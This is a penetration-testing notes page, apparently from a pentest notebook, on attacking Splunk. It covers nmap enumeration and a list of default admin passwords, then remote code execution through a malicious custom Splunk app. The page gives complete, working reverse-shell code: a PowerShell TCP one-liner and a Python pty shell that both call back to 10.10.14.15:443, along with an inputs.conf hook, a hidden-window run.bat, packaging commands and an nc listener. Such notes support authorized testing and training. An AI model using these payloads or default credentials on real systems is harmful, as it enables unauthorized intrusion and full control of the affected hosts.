## Enumeration 
#### external facing Splunk 
Splunk is prevalent in internal networks and often runs as root on Linux or SYSTEM on Windows systems. While uncommon, we may encounter Splunk externally facing at times.

Splunk web server runs by default on port `8000`
```bash
# nmap
sudo nmap -sV 10.129.201.50

# default credentials
admin : changeme
admin : admin
admin : Welcome
admin : Welcome1
....
```
![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/4cb7f93a-ac3c-4867-b2c3-9b29059f2983)

#### Splunk Free 
If we can logi in to Splunk (or having accessed an instance of Splunk Free), we can browse data, run reports, create dashboards, install applications from the Splunkbase library, and install custom applications.
![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/f77234c1-a816-4157-8189-9475bcf25dcd)


<br> 
<br> 

## Attacking Splunk 
#### RCE - Custom Splunk Application 
We can abuse the built-in functionality of Splunk to create a custom application. We can update the bin diretory to run any scripts (ex. PowerShell reverse shell). 
https://github.com/0xjpuff/reverse_shell_splunk

For Windows host: 
```bash
# powershell one-liner (rev.ps1) 
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# update inputs.conf to add our rev.ps1 shell
[script://.\bin\rev.ps1]
disabled = 0
sourcetype = shell
interval = 10

# update run.bat file
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit

# tar up directory
tar -cvzf reverse_shell_splunk.tgz reverse_shell_splunk
mv reverse_shell_splunk.tgz reverse_shell_splunk.spl

# launch listener
nc -lvnp 443
``` 
From dashboard select `Apps -> Install app from file` & upload .spl file 

For Linux host:
```bash
# rev.py
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
